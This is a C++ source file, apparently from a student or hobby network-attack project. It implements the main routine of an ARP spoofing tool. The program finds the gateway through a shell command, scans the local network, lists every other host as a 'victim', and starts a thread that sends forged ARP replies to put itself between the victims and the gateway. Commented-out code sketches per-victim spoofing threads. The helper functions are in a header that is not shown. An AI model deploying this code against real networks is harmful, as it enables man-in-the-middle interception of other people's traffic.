#include "utils.hpp"

using namespace std;

int main (int argc, char **argv) {
  if (argc != 2) {
    cout << "Usage: " << argv[0] << " <if_name>\n";
    return 1;
  }
  string ifname = argv[1];

  cout << "Available devices:\n";
  cout << "---------------------------------------\n";
  cout << "IP\t\tMAC\n";
  cout << "---------------------------------------\n";

  map<string, string> arp_table;

  // get gateway ip
  char *cmd = new char[100];
  strcpy(cmd, "echo `ip route | head -n 1 | awk '{print $3}'` > ./gate_ip");
  system(cmd);

  // read gate_ip to get gateway ip in char*
  char *gwip = new char[16];
  FILE *fp = fopen("./gate_ip", "r");
  fscanf(fp, "%s", gwip);
  fclose(fp);

  uint32_t dst_ip = inet_addr(gwip);
  test_arp(ifname.c_str(), dst_ip, arp_table);
  vector<string> victims;
  // ip -> mac (map)
  for(map<string, string>::iterator it = arp_table.begin(); it != arp_table.end(); it++) {
    if(it->first != gwip) {
      cout << it->first << '\t' << it->second << '\n';
      victims.push_back(it->first);
    }
  }

  // get my ip and mac
  // uint32_t my_ip;
  // int ifindex;
  //unsigned char my_mac[6];
  //get_if_info(ifname.c_str(), &my_ip, my_mac, &ifindex);
  unsigned char *gw_mac = new unsigned char[6];
  str2mac(arp_table[gwip].c_str(), gw_mac);
  // thread_reply(ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
  thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
  t1.join();

  // thread thrds2vct[victims.size()];
  // thread thrds2gw[victims.size()];
  
  // // create thread to send arp reply to spoof victim and gateway
  // for(uint i = 0; i < victims.size(); i++) {
  //   unsigned char *vctm_mac = new unsigned char[6];
  //   str2mac(arp_table[victims[i]].c_str(), vctm_mac);
  //   thrds2vct[i] = thread(thread_reply, ifindex, my_mac, vctm_mac, inet_addr(gwip), inet_addr(victims[i].c_str()));
  //   thrds2gw[i] = thread(thread_reply, ifindex, my_mac, gw_mac, inet_addr(victims[i].c_str()), inet_addr(gwip));
  // }
  // for(uint i = 0; i < victims.size(); i++) {
  //   thrds2vct[i].join();
  //   thrds2gw[i].join();
  // }

  return (EXIT_SUCCESS);
}
